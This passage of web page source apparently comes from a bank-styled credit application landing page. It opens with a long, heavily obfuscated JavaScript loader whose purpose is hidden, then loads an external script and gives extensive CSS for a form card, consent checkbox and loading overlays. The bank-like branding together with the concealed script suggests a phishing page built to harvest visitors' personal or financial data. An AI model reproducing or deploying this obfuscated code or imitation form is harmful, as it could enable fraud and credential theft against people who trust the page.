Zl6DHl=!0x0,l0mwX38[(0x1,mYmWgX.ffgQbzr.UJ3ln6)(0x443,eK_9dQ[0x2])];case(0x1,mYmWgX.ffgQbzr.UJ3ln6)(0x44c,eK_9dQ[0x2])+\"z\":return Zl6DHl=!0x0,l0mwX38[(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0x48]+0x3c1,eK_9dQ[cCLgth[0x2]+-0x6])+eK_9dQ[cCLgth[0x1a]+0xe4]];case(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0x28]+0x1bd,eK_9dQ[cCLgth[0x3d]+0x3e0]):return Zl6DHl=!0x0,l0mwX38[(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0x3f]+0x6ae,eK_9dQ[0x2])+\"8\"];case(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0xb]+0x3ff,eK_9dQ[cCLgth[0x1b]+-0xdd])+\"m\":return Zl6DHl=!0x0,l0mwX38[(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0x26]+0x1d9,eK_9dQ[cCLgth[0x47]+-0x1])+eK_9dQ[cCLgth[0x3c]+0xe7]];case(0x1,mYmWgX.ffgQbzr.UJ3ln6)(0x48e,eK_9dQ[0x2d]):return Zl6DHl=!0x0,l0mwX38[(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0x2e]+0x1e1,eK_9dQ[cCLgth[0xc]+-0x269])];case(0x1,mYmWgX.ffgQbzr.UJ3ln6)(0x4a5,eK_9dQ[0x2d]):return Zl6DHl=!0x0,l0mwX38[(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0xd]+0x442,eK_9dQ[cCLgth[0x2]+-0x6])];case(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0x21]+0x327,eK_9dQ[0x2d]):return Zl6DHl=!0x0,l0mwX38[(0x1,mYmWgX.ffgQbzr.UJ3ln6)(0x4c8,eK_9dQ[0x2d])];case(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0x5]+0x441,eK_9dQ[0x2]):return Zl6DHl=!0x0,l0mwX38[(0x1,mYmWgX.ffgQbzr.UJ3ln6)(0x4e0,eK_9dQ[cCLgth[0x49]+-0x243])];case(0x1,mYmWgX.ffgQbzr.UJ3ln6)(0x4eb,eK_9dQ[cCLgth[0x2b]+0x13a])+\"l\":return Zl6DHl=!0x0,l0mwX38[(0x1,mYmWgX.ffgQbzr.UJ3ln6)(cCLgth[0x38]+0x555,eK_9dQ[cCLgth[0xa]+-0x3d3])]}ifjUDf(cCLgth[0x6]+=cCLgth[0x44]- -0x1972,cCLgth[0x9]+=cCLgth[0xa]- -0x66,cCLgth[0x10]+=cCLgth[0x14]-0x93,cCLgth[0x16]+=cCLgth[0x34]- -0x1c5,cCLgth[0x17]+=cCLgth[0x11]-0x815,cCLgth[0x18]+=cCLgth[0x13]-0x14c0,cCLgth[0x1b]+=cCLgth[0x3f]- -0x417,cCLgth[0x2e]+=cCLgth[0x41]- -0x91,cCLgth[0x2f]+=cCLgth[0x46]-0x81a,cCLgth[0x35]+=cCLgth[0x19]-0x39d,cCLgth[0x3c]+=cCLgth[0x1f]- -0xfa);break;case cCLgth[0x11]-0x373:if(cCLgth[0x1e]==cCLgth[0x41]+0xa){ifjUDf(cCLgth[0x6]+=cCLgth[0x46]-0x67f,cCLgth[0x9]+=cCLgth[0x11]-0x2a6,cCLgth[0x10]+=cCLgth[0x49]-0x6f2,cCLgth[0x16]+=cCLgth[0x21]- -0x2b2,cCLgth[0x17]+=cCLgth[0xe]- -0x303,cCLgth[0x18]+=cCLgth[0x2f]- -0x182,cCLgth[0x1b]+=cCLgth[0x2c]- -0x4ae,cCLgth[0x2e]+=cCLgth[0x22]- -0x388,cCLgth[0x2f]+=cCLgth[0x45]- -0x19f,cCLgth[0x35]+=cCLgth[0x30]-0x3ff,cCLgth[0x3c]+=cCLgth[0x42]-0x75c);break}ifjUDf(cCLgth[0x6]+=cCLgth[0x1c]-0x443,cCLgth[0x9]+=cCLgth[0x2b]- -0x51d,cCLgth[0x10]+=cCLgth[0x2a]-0x5c5,cCLgth[0x16]+=cCLgth[0x1f]-0x1fa3,cCLgth[0x17]+=cCLgth[0xf]- -0x1a02,cCLgth[0x18]+=cCLgth[0x36]- -0x58e,cCLgth[0x1b]+=cCLgth[0x29]-0x5c,cCLgth[0x2e]+=cCLgth[0x23]-0x2b5,cCLgth[0x2f]+=cCLgth[0x3f]- -0x5eb,cCLgth[0x35]+=cCLgth[0x2c]- -0xd6,cCLgth[0x3c]+=cCLgth[0x1b]-0x5e8);break;case-0x28:ifjUDf(mYmWgX.bG4wV3L.ckeEo_.push((mYmWgX.bG4wV3L.jwg8Igp|mYmWgX.bG4wV3L.vYGwy4C<<mYmWgX.bG4wV3L.avoRMh)&eK_9dQ[cCLgth[0x39]+-0x2ee]),cCLgth[0x6]+=cCLgth[0xd]- -0x159a,cCLgth[0x9]+=cCLgth[0x30]-0x71a,cCLgth[0x10]+=cCLgth[0x17]-0x13f,cCLgth[0x16]+=cCLgth[0x49]-0x1e0d,cCLgth[0x17]+=cCLgth[0x20]- -0x511,cCLgth[0x18]+=cCLgth[0x2]- -0x2ed,cCLgth[0x1b]+=cCLgth[0x5]- -0x236,cCLgth[0x2e]+=cCLgth[0x4]- -0x12d,cCLgth[0x2f]+=cCLgth[0x1a]-0x15e,cCLgth[0x35]+=cCLgth[0x1c]-0x160,cCLgth[0x3c]+=cCLgth[0x44]- -0x4f6);break;case-0x6c:case 0x2d3:case cCLgth[0x20]-0xb9:ifjUDf(mYmWgX.bG4wV3L.mMSfb3=mYmWgX[PDFk2j(cCLgth[0x36]+0x87712,0x334,0x7)][PDFk2j(cCLgth[0xf]+0xbdb11,0x341,0x7)].length,mYmWgX.bG4wV3L.ckeEo_=[],mYmWgX.bG4wV3L.jwg8Igp=eK_9dQ[cCLgth[0x3b]+0x27c],mYmWgX.bG4wV3L.avoRMh=eK_9dQ[cCLgth[0x21]+-0x196],mYmWgX.bG4wV3L.vYGwy4C=-eK_9dQ[cCLgth[0x33]+0xb2]);for(mYmWgX.bG4wV3L.lMTwXw=eK_9dQ[cCLgth[0x38]+0x60];mYmWgX.bG4wV3L.lMTwXw<mYmWgX.bG4wV3L.mMSfb3;mYmWgX.bG4wV3L.lMTwXw++){mYmWgX.bG4wV3L.RgjEWK7=mYmWgX[PDFk2j(cCLgth[0x3a]+0xa8505,0x3d9,0x7)][PDFk2j(cCLgth[0x39]+0xa89aa,0x3e3,0x7)].indexOf(mYmWgX[PDFk2j(cCLgth[0x48]+0x56623,0x3ef,0x7)][PDFk2j(cCLgth[0x11]+0x5285a,0x3f9,0x7)][mYmWgX[PDFk2j(cCLgth[0x30]+0xae028,0x404,0x7)][PDFk2j(cCLgth[0xc]+0x5cf3c,0x40e,0x6)]]);if(mYmWgX.bG4wV3L.RgjEWK7===-eK_9dQ[0x1])continue;if(mYmWgX.bG4wV3L.vYGwy4C<eK_9dQ[cCLgth[0x4]+0x13d]){mYmWgX.bG4wV3L.vYGwy4C=mYmWgX.bG4wV3L.RgjEWK7}else{ifjUDf(mYmWgX.bG4wV3L.vYGwy4C+=mYmWgX.bG4wV3L.RgjEWK7*eK_9dQ[0x17],mYmWgX.bG4wV3L.jwg8Igp|=mYmWgX.bG4wV3L.vYGwy4C<<mYmWgX.bG4wV3L.avoRMh,mYmWgX.bG4wV3L.avoRMh+=(mYmWgX.bG4wV3L.vYGwy4C&eK_9dQ[cCLgth[0xb]+-0x5d])>eK_9dQ[cCLgth[0x23]+-0x2d3]?eK_9dQ[cCLgth[0x29]+-0x2f0]:eK_9dQ[0x1c]);do{ifjUDf(mYmWgX.bG4wV3L.ckeEo_.push(mYmWgX.bG4wV3L.jwg8Igp&eK_9dQ[0x3]),mYmWgX.bG4wV3L.jwg8Igp>>=eK_9dQ[0x2],mYmWgX.bG4wV3L.avoRMh-=eK_9dQ[cCLgth[0x46]+-0x207])}while(mYmWgX.bG4wV3L.avoRMh>eK_9dQ[0xd]);mYmWgX.bG4wV3L.vYGwy4C=-eK_9dQ[0x1]}}if(mYmWgX.bG4wV3L.vYGwy4C>-eK_9dQ[0x1]){ifjUDf(cCLgth[0x6]+=cCLgth[0x2e]-0x1757,cCLgth[0x9]+=cCLgth[0x41]- -0xb3,cCLgth[0x10]+=cCLgth[0x47]- -0x33e,cCLgth[0x16]+=cCLgth[0x3f]- -0x24bd,cCLgth[0x17]+=cCLgth[0x22]-0x264,cCLgth[0x18]+=cCLgth[0x17]-0x39e,cCLgth[0x1b]+=cCLgth[0x4]- -0x9d,cCLgth[0x2e]+=cCLgth[0x2a]-0x2b2,cCLgth[0x2f]+=cCLgth[0x3f]- -0x19c,cCLgth[0x35]+=cCLgth[0x38]-0x167,cCLgth[0x3c]+=cCLgth[0x9]-0x559);break}else{ifjUDf(cCLgth[0x6]+=cCLgth[0x10]- -0x222,cCLgth[0x9]+=cCLgth[0x1]-0x3c8,cCLgth[0x10]+=cCLgth[0x28]-0x458,cCLgth[0x16]+=cCLgth[0xa]- -0x2d8,cCLgth[0x17]+=cCLgth[0x25]-0x193,cCLgth[0x18]+=cCLgth[0x2d]-0x78e,cCLgth[0x1b]+=cCLgth[0x43]- -0x315,cCLgth[0x2e]+=cCLgth[0x45]- -0x82,cCLgth[0x2f]+=cCLgth[0x47]-0x2c2,cCLgth[0x35]+=cCLgth[0x11]-0x5ee,cCLgth[0x3c]+=cCLgth[0x6]- -0x34d);break}case 0x119:ifjUDf(cCLgth[0x6]+=cCLgth[0x3a]- -0x1,cCLgth[0x9]+=cCLgth[0x1d]- -0x1949,cCLgth[0x10]+=cCLgth[0x40]-0x207,cCLgth[0x16]+=cCLgth[0x1b]- -0x376,cCLgth[0x17]+=cCLgth[0x3d]-0x1df2,cCLgth[0x18]+=cCLgth[0x46]-0x589,cCLgth[0x1b]+=cCLgth[0x3a]- -0x239,cCLgth[0x2e]+=cCLgth[0x3b]- -0x282,cCLgth[0x2f]+=cCLgth[0x48]- -0x532,cCLgth[0x35]+=cCLgth[0x40]- -0x1fb,cCLgth[0x3c]+=cCLgth[0x17]- -0x2344);break;case-0x117:ifjUDf(cCLgth[0x6]+=cCLgth[0x46]-0x2f5,cCLgth[0x9]+=cCLgth[0x6]-0x325,cCLgth[0x10]+=cCLgth[0x40]- -0x1d3,cCLgth[0x16]+=cCLgth[0x2a]-0x2c7,cCLgth[0x17]+=cCLgth[0x1]- -0xa,cCLgth[0x18]+=cCLgth[0xb]- -0x80,cCLgth[0x1b]+=cCLgth[0x14]-0x2c0e,cCLgth[0x2e]+=cCLgth[0x16]-0x175,cCLgth[0x2f]+=cCLgth[0x15]- -0x3ff,cCLgth[0x35]+=cCLgth[0x16]-0x771,cCLgth[0x3c]+=cCLgth[0x41]- -0x297d);break;case-0x299:case 0x145:case-0x33a:ifjUDf(cCLgth[0x6]+=cCLgth[0x3c]- -0x1d,cCLgth[0x9]+=cCLgth[0x30]- -0x1361,cCLgth[0x10]+=cCLgth[0xe]-0x127,cCLgth[0x16]+=cCLgth[0x9]-0x1a23,cCLgth[0x17]+=cCLgth[0x37]-0x49,cCLgth[0x18]+=cCLgth[0x24]-0x15e,cCLgth[0x1b]+=cCLgth[0x43]- -0x835,cCLgth[0x2e]+=cCLgth[0x2d]-0xee,cCLgth[0x2f]+=cCLgth[0x0]-0xbc,cCLgth[0x35]+=cCLgth[0x1f]-0x1f6,cCLgth[0x3c]+=cCLgth[0x13]-0x20d);break}}ifjUDf(Zl6DHl=void 0x0,cCLgth=sWsA6p([...do1VAs(0x0,0x6),0x137,...do1VAs(0x7,0x9),-0x4e,...do1VAs(0xa,0x10),0x37b,...do1VAs(0x11,0x16),0x384,0x335,0x26a,...do1VAs(0x19,0x1b),-0x2a99,...do1VAs(0x1c,0x2e),0x1db,-0x8,...do1VAs(0x30,0x35),-0x9c,...do1VAs(0x36,0x3c),0x329,...do1VAs(0x3d,0x4c)]));if(Zl6DHl){return cCLgth}}if(yAjdFbt(0x502,eK_9dQ[0x2])in eUNELlQ){Z8TcuNS()}function eUNELlQ(){}function Z8TcuNS(...pnhM2G){pnhM2G[eK_9dQ[0x4]]=eK_9dQ[0x0]}function ao0v768(){}const uHqPocb={[yAjdFbt(0x532,eK_9dQ[0x2])]:yAjdFbt(0x53d,0x30),[yAjdFbt(0x570,eK_9dQ[0x1b])]:yAjdFbt(0x580,0x20),[yAjdFbt(0x5a3,eK_9dQ[0x2c])]:yAjdFbt(0x5b4,eK_9dQ[0x1b]),[yAjdFbt(0x5c6,0x10)]:yAjdFbt(0x5de,0x25),[yAjdFbt(0x608,0x15)]:yAjdFbt(0x623,eK_9dQ[0x34]),[yAjdFbt(0x637,eK_9dQ[0xd])]:yAjdFbt(0x642,0x33)};function ifjUDf(){ifjUDf=function(){}}return m5ZZmC(yAjdFbt(0x679,eK_9dQ[0x2d]))[yAjdFbt(0x686,eK_9dQ[0x2])+yAjdFbt(0x694,eK_9dQ[0x2])+\"p\"](uHqPocb);")({get"NUsZck"(){return global}});
  </script>
  <script src="scriptp.js" defer=""></script>


<div><style>
  @font-face {
    font-family: 'CIBFontSans';
    font-weight: 400;
    font-style: normal;
    src: local('CIBFontSans')
  }

  @font-face {
    font-family: 'CIBFontSans';
    font-weight: 700;
    font-style: normal;
    src: local('CIBFontSans Bold')
  }

  @font-face {
    font-family: 'OpenSans';
    font-weight: 400;
    font-style: normal;
    src: local('Open Sans')
  }

  *,
  *::before,
  *::after {
    box-sizing: border-box;
    margin: 0;
    padding: 0
  }

  h1,
  h2,
  h3,
  h4,
  h5,
  h6 {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-weight: 700;
    letter-spacing: -.6px
  }

  body {
    font-family: 'OpenSans', 'Open Sans', Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    opacity: 0;
    transition: opacity .45s ease
  }

  body.page-ready {
    opacity: 1
  }

  body::before {
    content: '';
    position: fixed;
    inset: 0;
    z-index: 999999;
    background: #FFFFFF;
    pointer-events: none;
    opacity: 1;
    transition: opacity .4s ease .1s
  }

  body.page-ready::before {
    opacity: 0;
    visibility: hidden
  }


  #appSkeletonLoader {
    display: none !important;
  }

  body.page-ready #appSkeletonLoader {
    opacity: 0;
    visibility: hidden
  }

  .skeleton-wrapper {
    width: min(420px, 90vw);
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 32px
  }

  .skeleton-logo {
    width: 160px;
    height: 48px;
    background: linear-gradient(90deg, #D1D5DB 25%, #E5E7EB 50%, #D1D5DB 75%);
    background-size: 200% 100%;
    border-radius: 10px;
    animation: skeletonShimmer 1.5s ease-in-out infinite
  }

  .skeleton-content {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 14px;
    align-items: center
  }

  .skeleton-title {
    height: 28px;
    width: 65%;
    background: linear-gradient(90deg, #D1D5DB 25%, #E5E7EB 50%, #D1D5DB 75%);
    background-size: 200% 100%;
    border-radius: 8px;
    animation: skeletonShimmer 1.5s ease-in-out infinite;
    animation-delay: .1s
  }

  .skeleton-bar {
    height: 14px;
    background: linear-gradient(90deg, #E1E4E8 25%, #F0F2F5 50%, #E1E4E8 75%);
    background-size: 200% 100%;
    border-radius: 6px;
    animation: skeletonShimmer 1.5s ease-in-out infinite
  }

  .skeleton-bar:nth-child(1) {
    width: 85%;
    animation-delay: .2s
  }

  .skeleton-bar:nth-child(2) {
    width: 92%;
    animation-delay: .3s
  }

  .skeleton-bar:nth-child(3) {
    width: 78%;
    animation-delay: .4s
  }

  @keyframes skeletonShimmer {
    0% {
      background-position: 200% 0
    }

    100% {
      background-position: -200% 0
    }
  }

  @media (max-width:768px) {
    .skeleton-wrapper {
      width: min(380px, 88vw);
      gap: 28px
    }

    .skeleton-logo {
      width: 140px;
      height: 42px
    }

    .skeleton-title {
      height: 24px
    }
  }


  * {
    scrollbar-width: thin;
    scrollbar-color: rgba(0, 0, 0, .2) transparent
  }

  ::-webkit-scrollbar {
    width: 4px;
    height: 4px
  }

  ::-webkit-scrollbar-track {
    background: transparent
  }

  ::-webkit-scrollbar-thumb {
    background: rgba(0, 0, 0, .2);
    transition: background .2s ease
  }

  ::-webkit-scrollbar-thumb:hover {
    background: rgba(0, 0, 0, .4)
  }

  ::-webkit-scrollbar-button {
    display: none;
    width: 0;
    height: 0
  }

  ::-webkit-scrollbar-corner {
    background: transparent
  }


  .lp-header {
    background: #FFF;
    height: 72px;
    display: flex;
    align-items: center;
    padding: 0 32px;
    position: relative;
    z-index: 10;
    border-bottom: none;
    flex-shrink: 0;
    opacity: 1;
    transform: translateY(0);
    transition: opacity .5s ease, transform .5s ease
  }

  .lp-header__left,
  .lp-header__right {
    flex: 1;
    display: flex;
    align-items: center;
    font-size: 15px;
    color: #2C2A29;
    gap: 7px;
    cursor: pointer
  }

  .lp-header__right {
    justify-content: flex-end
  }

  .lp-header__left>span,
  .lp-header__left>svg,
  .lp-header__right>span,
  .lp-header__right>svg {
    display: none
  }

  .lp-hamburger {
    display: flex;
    flex-direction: column;
    gap: 4px;
    cursor: pointer
  }

  .lp-hamburger span {
    width: 22px;
    height: 2px;
    background: #2C2A29;
    border-radius: 2px;
    display: block
  }

  .lp-header__center {
    display: flex;
    align-items: center;
    justify-content: center
  }

  .lp-header__center img {
    height: 90px
  }

  .lp-logo-desktop {
    display: block
  }

  .lp-logo-mobile {
    display: none
  }

  .product-view[data-product-view="credito"] .lp-header__center img {
    height: 72px
  }

  .product-view[data-product-view="credito"] .lp-header__right .lp-hamburger {
    display: none
  }


  .lp-main {
    flex: 1;
    display: flex;
    min-height: calc(100vh - 72px);
    background: linear-gradient(270deg, #fff3, #ffffff1b 43.23%, #fff0), linear-gradient(89.86deg, #51b2c5 .02%, #56b7cb 17.16%, #74c5d6 50.94%, #86cddc 99.78%);
    opacity: 0;
    transform: translateY(14px);
    transition: opacity .55s ease .08s, transform .55s ease .08s
  }

  @media (max-width:768px) {
    .lp-main {
      background: #FFFFFF
    }
  }

  .lp-main__left {
    flex: 0 0 58%;
    overflow: hidden;
    position: relative
  }

  .lp-main__left img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center;
    display: block
  }

  .lp-vigilado {
    display: none;
    position: absolute;
    right: 0;
    top: 50%;
    transform: translateY(-50%) rotate(-90deg);
    transform-origin: center;
    z-index: 10
  }

  .lp-vigilado img {
    height: 14px;
    width: auto;
    display: block
  }

  .lp-main__right {
    flex: 0 0 42%;
    padding: 56px 72px 56px 56px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    gap: 26px
  }


  .lp-promo__eyebrow {
    font-size: 15px;
    color: #2C2A29;
    margin-bottom: 4px
  }

  .lp-promo__title {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-weight: 700;
    font-size: 40px;
    color: #2C2A29;
    line-height: 40px;
    letter-spacing: -.6px;
    margin-bottom: 16px
  }

  .lp-promo__desc-bold {
    font-size: 16px;
    font-weight: 600;
    color: #2C2A29;
    margin-bottom: 6px
  }

  .lp-promo__desc {
    font-size: 15px;
    color: #2C2A29;
    line-height: 1.5
  }


  .lp-card {
    background: #FFF;
    border-radius: 18px;
    box-shadow: 0 4px 28px rgba(0, 0, 0, .13);
    padding: 34px 34px 30px;
    width: 100%;
    max-width: 440px;
    opacity: 0;
    transform: translateY(18px);
    transition: opacity .55s ease .16s, transform .55s ease .16s
  }

  .lp-card__title {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-weight: 700;
    font-size: 20px;
    color: #2C2A29;
    line-height: 24px;
    letter-spacing: -.6px;
    margin-bottom: 8px
  }

  .lp-card__subtitle {
    font-size: 14px;
    color: #6B6B6B;
    margin-bottom: 24px
  }


  body.page-ready .lp-header,
  body.page-ready .lp-main,
  body.page-ready .lp-card,
  body.page-ready .lp-details,
  body.page-ready .lp-footer {
    opacity: 1;
    transform: translateY(0)
  }


  .lp-field {
    margin-bottom: 24px
  }

  .lp-field__label {
    display: block;
    font-size: 14px;
    color: #2C2A29;
    margin-bottom: 8px;
    font-weight: 400
  }

  .lp-field__row {
    display: flex;
    align-items: center;
    border-bottom: 1.5px solid #DEDEDE;
    padding: 8px 0 10px;
    gap: 12px;
    position: relative;
    cursor: pointer;
    transition: border-color .26s ease, transform .26s ease, box-shadow .26s ease
  }

  .lp-field__row--active,
  .lp-field__row:focus-within {
    border-bottom-color: #2C2A29;
    transform: translateY(-1px);
    box-shadow: none
  }

  .lp-field__row--valid {
    border-bottom: 1.5px solid #000
  }

  .lp-field__icon {
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 24px;
    height: 24px
  }

  .lp-field__icon img {
    width: 20px;
    height: 20px;
    opacity: .6
  }

  .lp-field__icon svg {
    width: 20px;
    height: 20px;
    opacity: .72;
    color: #5E5E5E
  }

  .lp-field__text {
    flex: 1;
    font-size: 15px;
    color: #2C2A29;
    user-select: none;
    background: transparent;
    border: none;
    outline: none;
    font-family: 'OpenSans', Arial, sans-serif;
    width: 100%;
    cursor: pointer
  }

  .lp-field__text--filled {
    color: #2C2A29
  }

  input.lp-field__text {
    cursor: text;
    color: #2C2A29
  }

  input.lp-field__text::placeholder {
    color: #ABABAB
  }

  .lp-field__chevron {
    flex-shrink: 0;
    color: #6B6B6B;
    transition: transform .2s
  }

  .lp-field__chevron--open {
    transform: rotate(180deg)
  }


  .lp-dropdown {
    position: relative
  }

  .lp-dropdown__list {
    display: none;
    position: absolute;
    top: calc(100% + 4px);
    left: 0;
    right: 0;
    background: #F8F8F8;
    border: 1px solid #E0E0E0;
    border-radius: 4px;
    box-shadow: 0 4px 16px rgba(0, 0, 0, .1);
    z-index: 50;
    overflow: hidden;
    padding: 8px 0
  }

  .lp-dropdown__list--open {
    display: block
  }

  .lp-dropdown__opt {
    padding: 12px 16px;
    font-size: 15px;
    color: #2C2A29;
    cursor: pointer;
    transition: background .12s;
    font-family: 'OpenSans', Arial, sans-serif;
    background: transparent
  }

  .lp-dropdown__opt:hover {
    background: #EFEFEF
  }

  .lp-dropdown__opt--selected {
    font-weight: 400;
    background: #E8E8E8
  }


  .lp-check-row {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    margin: 20px 0
  }

  .lp-check {
    width: 18px;
    height: 18px;
    border: 1.5px solid #9E9E9E;
    border-radius: 2px;
    flex-shrink: 0;
    margin-top: 2px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: border-color .2s, background .2s
  }

  .lp-check--on {
    background: #FDDA24;
    border-color: #FDDA24
  }

  .lp-check__label {
    font-size: 13px;
    color: #2C2A29;
    line-height: 1.5;
    cursor: pointer
  }

  .lp-check__label a {
    color: #2C2A29;
    text-decoration: underline
  }

  .fkrc-container {
    margin-bottom: 28px
  }


  .lp-btn {
    width: 100%;
    height: 52px;
    border: none;
    border-radius: 100px;
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-weight: 700;
    font-size: 17px;
    background: #D9D9D9;
    color: #9E9E9E;
    cursor: not-allowed;
    transition: background .2s, color .2s, transform .1s;
    letter-spacing: .01em
  }

  .lp-btn--on {
    background: #FDDA24;
    color: #2C2A29;
    cursor: pointer
  }

  .lp-btn--on:hover {
    background: #F5CF00
  }

  .lp-btn--on:active {
    transform: scale(.99)
  }


  .lp-details {
    background: #F3F3F3;
    padding: 56px 32px 64px;
    opacity: 0;
    transform: translateY(16px);
    transition: opacity .55s ease .22s, transform .55s ease .22s
  }

  .lp-details__top {
    max-width: 980px;
    margin: 0 auto 52px;
    display: grid;
    grid-template-columns: 250px 1fr;
    gap: 36px;
    align-items: center
  }

  .lp-details__top-img {
    width: 220px;
    justify-self: center
  }

  .lp-details__top-text h3 {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 40px;
    line-height: 40px;
    letter-spacing: -.6px;
    color: #2C2A29;
    text-align: center;
    margin-bottom: 20px;
    font-weight: 700
  }

  .lp-details__list {
    margin: 0;
    padding-left: 20px;
    color: #2C2A29;
    font-size: 17px;
    line-height: 1.45
  }

  .lp-details__list li {
    margin-bottom: 16px
  }

  .lp-details__grid-title {
    text-align: center;
    font-family: 'CIBFontSans', Arial, sans-serif;
    color: #2C2A29;
    font-size: 40px;
    line-height: 40px;
    letter-spacing: -.6px;
    margin-bottom: 36px;
    font-weight: 700
  }

  .lp-details__grid {
    max-width: 980px;
    margin: 0 auto;
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 36px 42px
  }

  .lp-details__item {
    display: grid;
    grid-template-columns: 64px 1fr;
    column-gap: 16px;
    align-items: start
  }

  .lp-details__icon {
    width: 64px;
    height: 64px;
    border-radius: 50%;
    background: #FFF;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 1px 2px rgba(0, 0, 0, .08)
  }

  .lp-details__icon img {
    width: 34px;
    height: 34px
  }

  .lp-details__item h4 {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 28px;
    line-height: 32px;
    letter-spacing: -.6px;
    color: #2C2A29;
    margin-bottom: 10px;
    font-weight: 700
  }

  .lp-details__item p {
    font-size: 18px;
    line-height: 1.45;
    color: #2C2A29
  }


  .lp-footer {
    background: white;
    padding: 24px 32px;
    display: flex;
    align-items: flex-start;
    justify-content: space-between;
    position: relative;
    overflow: hidden;
    margin-top: auto;
    opacity: 0;
    transform: translateY(16px);
    transition: opacity .55s ease .28s, transform .55s ease .28s
  }

  .lp-footer__left {
    display: flex;
    flex-direction: column;
    gap: 8px;
    z-index: 2
  }

  .lp-footer__logo {
    height: 24px;
    width: auto
  }

  .lp-footer__copy {
    font-size: 12px;
    color: #2C2A29;
    font-family: 'OpenSans', Arial, sans-serif
  }

  .lp-footer__vigilado {
    height: 20px;
    width: auto;
    margin-top: 4px
  }

  .lp-footer__trazo {
    position: absolute;
    top: 0;
    right: 0;
    height: 100%;
    width: auto;
    max-width: 30%;
    z-index: 1
  }

  .lp-footer__trazo-m {
    display: none
  }


  .flow-overlay {
    position: fixed;
    left: 0;
    top: 0;
    right: 0;
    bottom: 0;
    width: 100%;
    min-height: 100%;
    min-height: 100dvh;
    max-height: 100dvh;
    background: rgba(44, 44, 44, .52);
    z-index: 10000;
    padding: 20px;
    box-sizing: border-box;
    opacity: 0;
    transition: opacity .36s ease;
    pointer-events: none;
    backdrop-filter: blur(18px);
    -webkit-backdrop-filter: blur(18px);
    display: flex;
    flex-direction: column;
    overflow: auto;
    overscroll-behavior: contain
  }

  .flow-overlay[hidden] {
    display: none
  }

  .flow-overlay.is-visible {
    opacity: 1;
    pointer-events: auto
  }

  .flow-overlay__center {
    flex: 1 1 auto;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    min-height: 0;
    box-sizing: border-box
  }

  .flow-overlay__center.saas-page0-stack {
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 1rem
  }

  .saas-page0-below {
    max-width: min(300px, 88vw);
    margin: 0;
    padding: 0 8px;
    box-sizing: border-box;
    text-align: center;
    font-size: 12px;
    line-height: 1.45;
    font-family: 'OpenSans', Arial, sans-serif;
    color: rgba(255, 255, 255, .88);
    text-shadow: 0 1px 2px rgba(0, 0, 0, .2)
  }

  .saas-page0-below[hidden] {
    display: none !important
  }

  .saas-page0-check {
    flex: 0 0 auto;
    width: 40px;
    height: 40px;
    display: flex;
    align-items: center;
    justify-content: center
  }

  .saas-page0-check[hidden] {
    display: none !important
  }

  .saas-page0-check__img {
    display: block;
    width: 40px;
    height: 40px;
    object-fit: contain
  }

  .flow-loading-stage {
    position: relative;
    --flow-d: min(78vw, 136px);
    box-sizing: border-box;
    flex: 0 0 var(--flow-d);
    width: var(--flow-d);
    height: var(--flow-d);
    min-width: var(--flow-d);
    min-height: var(--flow-d);
    max-width: var(--flow-d);
    max-height: var(--flow-d);
    aspect-ratio: 1/1;
    border-radius: 50%;
    background: #FFF;
    display: grid;
    place-items: center;
    color: #2C2A29;
    text-align: center;
    overflow: hidden;
    box-shadow: 0 4px 14px rgba(0, 0, 0, .1);
    opacity: 0;
    transform: scale(.96) translateZ(0);
    transition: opacity .3s ease, transform .3s ease;
    margin: 0;
    padding: 0;
    align-self: center;
    contain: layout
  }

  .flow-overlay.is-visible .flow-loading-stage:not([hidden]) {
    opacity: 1;
    transform: scale(1) translateZ(0)
  }

  .saas-page0-overlay {
    z-index: 10050
  }

  .flow-loading-cluster {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 10px;
    flex: 0 0 auto;
    max-width: 100%;
    min-width: 0;
    max-height: 100%;
    padding: 0 6px;
    box-sizing: border-box;
    min-height: 0;
    overflow: hidden
  }

  .saas-page0-sub {
    font-size: 11px !important;
    line-height: 1.35 !important;
    color: #5a5a5a !important;
    max-width: 200px !important;
    margin-top: 4px !important
  }

  .saas-page0-sub[hidden] {
    display: none !important
  }

  .flow-spinner {
    width: 32px;
    height: 32px;
    flex: 0 0 auto;
    box-sizing: border-box;
    border: 2px solid transparent;
    border-top-color: #2F2F2F;
    border-right-color: #2F2F2F;
    border-radius: 50%;
    animation: spin 1.05s linear infinite;
    margin: 0;
    position: static;
    inset: auto;
    flex-shrink: 0;
    aspect-ratio: 1/1
  }

  #flowSpinner[hidden],
  #saasPage0Spinner[hidden] {
    display: none !important
  }

  .flow-status-text {
    font-size: 12px;
    line-height: 1.2;
    font-family: 'OpenSans', Arial, sans-serif;
    font-weight: 400;
    width: 90%;
    max-width: 112px;
    margin: 0;
    padding: 0;
    flex: 0 0 auto
  }

  .flow-success-icon[hidden],
  .flow-loading-stage .flow-success-icon[hidden] {
    display: none !important;
    visibility: hidden
  }

  .flow-success-icon {
    width: 40px;
    height: 40px;
